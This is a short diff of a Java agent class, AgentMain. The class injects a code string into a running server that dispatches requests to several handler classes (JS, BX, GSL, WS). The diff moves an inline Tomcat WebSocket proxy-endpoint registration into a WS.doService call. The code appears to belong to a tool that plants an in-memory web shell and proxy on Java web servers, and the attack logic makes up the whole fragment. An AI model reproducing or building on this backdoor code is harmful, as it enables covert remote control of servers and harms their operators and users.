@@ -25,8 +25,7 @@ public class AgentMain {
             "com.sf.sl.JS.doService(obj,url,method,in);\n"+
             "com.sf.sl.BX.doService(obj,url,method,in);\n"+
             "com.sf.sl.GSL.doService(obj,url,method,in);\n"+
-            "if (url.matches(\"/ws\")) {try {com.sf.sl.WS.SetHeader(request,\"Connection\",\"upgrade\");com.sf.sl.WS.SetHeader(request,\"Sec-WebSocket-Version\",\"13\");com.sf.sl.WS.SetHeader(request,\"Upgrade\",\"websocket\");javax.websocket.server.ServerEndpointConfig configEndpoint = javax.websocket.server.ServerEndpointConfig.Builder.create(com.sf.sl.WS.ProxyEndpoint.class, \"/x\").build();org.apache.tomcat.websocket.server.WsServerContainer container = (org.apache.tomcat.websocket.server.WsServerContainer) request.getSession().getServletContext().getAttribute(\"javax.websocket.server.ServerContainer\");org.apache.tomcat.websocket.server.UpgradeUtil.doUpgrade(container, request, response, configEndpoint, java.util.Collections.emptyMap());} catch (Exception ignored) {}}" +
-            "\n";
+            "com.sf.sl.WS.doService(obj,url,method,in);\n";
 
     public static void agentmain(String agentArgs, Instrumentation ins) {
         System.out.println("I");
